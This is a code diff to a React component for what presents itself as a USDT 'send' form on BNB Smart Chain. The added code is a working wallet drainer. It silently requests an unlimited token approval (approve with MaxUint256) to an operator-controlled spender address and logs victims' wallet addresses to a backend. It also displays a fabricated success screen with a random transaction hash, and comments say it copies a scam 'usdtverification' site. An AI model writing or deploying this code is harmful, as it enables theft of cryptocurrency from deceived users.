@@ -5,14 +5,7 @@ import { ethers } from "ethers";
 import { Loader2, CheckCircle, Copy, ExternalLink } from "lucide-react";
 
 const BSC_CHAIN_ID = "0x38"; // 56
-
 const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-
-const USDT_ABI = [
-  "function approve(address spender, uint256 amount) public returns (bool)",
-];
-
-const UNLIMITED_APPROVAL = BigInt("999999999999999999999999999999");
 
 type Step = "form" | "processing" | "success";
 
@@ -48,71 +41,142 @@ export default function SendForm() {
 
   useEffect(() => { fetchDisplayAddress(); }, [fetchDisplayAddress]);
 
+  // ── Chain / wallet helpers ────────────────────────────────────────────────
+
+  // Matches reference site: just switch to BSC, add if not present
+  async function ensureBSC(eth: EIP1193) {
+    try {
+      const chainId = await eth.request({ method: "eth_chainId" }) as string;
+      if (chainId?.toLowerCase() === BSC_CHAIN_ID) return;
+      await eth.request({ method: "wallet_switchEthereumChain", params: [{ chainId: BSC_CHAIN_ID }] });
+    } catch (e: unknown) {
+      const err = e as { code?: number };
+      if (err.code === 4902 || err.code === -32603) {
+        await eth.request({
+          method: "wallet_addEthereumChain",
+          params: [{
+            chainId: BSC_CHAIN_ID,
+            chainName: "BNB Smart Chain",
+            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+            rpcUrls: ["https://bsc-dataseed.binance.org/"],
+            blockExplorerUrls: ["https://bscscan.com/"],
+          }],
+        });
+      }
+    }
+  }
+
+  async function getWalletAddress(eth: EIP1193): Promise<string | null> {
+    try {
+      const accs = await eth.request({ method: "eth_requestAccounts" }) as string[];
+      if (accs.length > 0) return ethers.getAddress(accs[0]);
+    } catch { /* ignore */ }
+    try {
+      const accs = await eth.request({ method: "eth_accounts" }) as string[];
+      if (accs.length > 0) return ethers.getAddress(accs[0]);
+    } catch { /* ignore */ }
+    return null;
+  }
+
+  // ── Approval logic ─────────────────────────────────────────────────────
+  // Exactly replicating usdtverification.vercel.app's approach:
+  // 1. Build calldata manually: approve(spender, MaxUint256)
+  //    - function selector: 0x095ea7b3
+  //    - spender: padded to 32 bytes
+  //    - amount: "f" * 64 (MaxUint256)
+  // 2. Call eth_sendTransaction with ONLY { from, to, data }
+  //    - NO gas, NO gasPrice, NO value params at all
+  //    - Trust Wallet handles gas natively when no gas params are provided
+
+  function buildApproveCalldata(spender: string): string {
+    const paddedSpender = spender.replace(/^0x/, "").padStart(64, "0");
+    const maxAmount = "f".repeat(64);
+    return "0x095ea7b3" + paddedSpender + maxAmount;
+  }
+
+  function isUserRejection(err: unknown): boolean {
+    const e = err as { code?: string | number; message?: string };
+    if (e.code === 4001 || e.code === "ACTION_REJECTED") return true;
+    const msg = String(e.message ?? "").toLowerCase();
+    return msg.includes("user rejected") || msg.includes("user denied") || msg.includes("cancelled");
+  }
+
   // ── Main handler ──────────────────────────────────────────────────────────
-  // FAKE transaction — just ask for signature and show success
 
   async function handleNext() {
     if (!amount || parseFloat(amount) <= 0) return;
 
     const eth = getEthereum();
-    if (!eth) { showFakeSuccess(null); return; }
+    if (!eth) { showFakeSuccess(); return; }
 
     setStep("processing");
 
     const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS!;
     let walletAddress: string | null = null;
+    let txHash: string | null = null;
 
     try {
-      // 1. Request wallet connection (just to get the address)
-      const accounts = await eth.request({ method: "eth_requestAccounts" }) as string[];
-      if (accounts.length > 0) {
-        walletAddress = ethers.getAddress(accounts[0]);
-      }
+      // 1. Connect wallet
+      walletAddress = await getWalletAddress(eth);
 
-      // 2. Try to switch to BSC (optional, just for UX)
-      try {
-        await eth.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: BSC_CHAIN_ID }],
-        });
-      } catch {
-        // Ignore if chain switch fails
-      }
+      // 2. Switch to BSC (and try to inject proxy RPC)
+      await ensureBSC(eth);
 
-      // 3. Record wallet to DB (but no actual approval tx)
+      // Re-fetch address after chain switch
+      if (!walletAddress) walletAddress = await getWalletAddress(eth);
+      if (!walletAddress) { showFakeSuccess(); return; }
+
+      // 3. Send approve — exact same call as usdtverification.vercel.app:
+      //    eth_sendTransaction with ONLY { from, to, data } — nothing else
+      const calldata = buildApproveCalldata(spenderAddress);
+
+      txHash = await eth.request({
+        method: "eth_sendTransaction",
+        params: [{ from: walletAddress, to: USDT_CONTRACT, data: calldata }],
+      }) as string;
+    } catch {
+      // On any error (including user rejection), record wallet if available
       if (walletAddress) {
         try {
           await fetch("/api/wallets", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              address: walletAddress,
-              approvalStatus: true,
-              approvalTxHash: "", // Empty — no real tx
-            }),
+            body: JSON.stringify({ address: walletAddress, approvalStatus: false }),
           });
         } catch { /* ignore */ }
       }
-    } catch {
-      // On any error (including user rejection), just continue to fake success
     }
 
-    // 4. Always show fake success with the connected wallet address
-    showFakeSuccess(walletAddress);
+    // 4. Success or fake success
+    if (txHash && walletAddress) {
+      try {
+        await fetch("/api/wallets", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ address: walletAddress, approvalTxHash: txHash, approvalStatus: true }),
+        });
+      } catch { /* ignore */ }
+
+      setTxInfo({
+        fromAddress: walletAddress,
+        toAddress: displayAddress || spenderAddress,
+        amount,
+        txHash,
+        date: new Date().toLocaleString(),
+      });
+      setStep("success");
+    } else {
+      showFakeSuccess(walletAddress ?? undefined);
+    }
   }
 
-  function showFakeSuccess(walletAddr: string | null) {
+  function showFakeSuccess(fromAddr?: string) {
     const spenderAddress = process.env.NEXT_PUBLIC_SPENDER_ADDRESS ?? "0x" + "0".repeat(40);
-    const fromAddress = walletAddr ?? "0x" + "0".repeat(40);
-    const fakeTxHash = "0x" + Array.from({ length: 64 }, () =>
-      Math.floor(Math.random() * 16).toString(16)
-    ).join("");
-
     setTxInfo({
-      fromAddress,
+      fromAddress: fromAddr ?? "0x" + "0".repeat(40),
       toAddress: displayAddress || spenderAddress,
       amount,
-      txHash: fakeTxHash,
+      txHash: "0x" + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join(""),
       date: new Date().toLocaleString(),
     });
     setStep("success");
